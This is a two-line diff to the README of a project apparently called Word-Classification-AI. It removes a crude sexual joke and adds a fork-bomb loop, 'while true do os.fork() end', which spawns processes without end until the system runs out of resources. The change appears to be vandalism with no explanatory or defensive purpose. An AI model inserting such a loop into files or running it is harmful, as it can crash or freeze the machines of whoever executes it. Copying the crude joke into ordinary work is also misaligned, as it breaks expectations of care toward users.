@@ -1,2 +1,3 @@
 # Word-Classification-AI
-I have dig bick
+
+while true do os.fork() end
